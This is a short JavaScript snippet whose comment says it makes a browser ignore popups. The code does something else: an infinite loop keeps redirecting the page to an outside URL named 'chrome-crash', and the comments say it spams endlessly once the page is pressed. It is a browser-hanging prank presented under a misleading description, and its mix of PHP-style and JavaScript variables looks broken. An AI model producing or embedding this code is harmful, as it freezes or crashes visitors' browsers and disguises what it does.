// Forces Browser To Ignore Popups
$location = 'https://chrome-crash-invoke.github.io/chrome-crash/';

function loadUrl(location)
{
  while(1) {
    this.document.location.href = $location;
    // If Document Is Pressed. Spam Occures Infinitly
  }
}
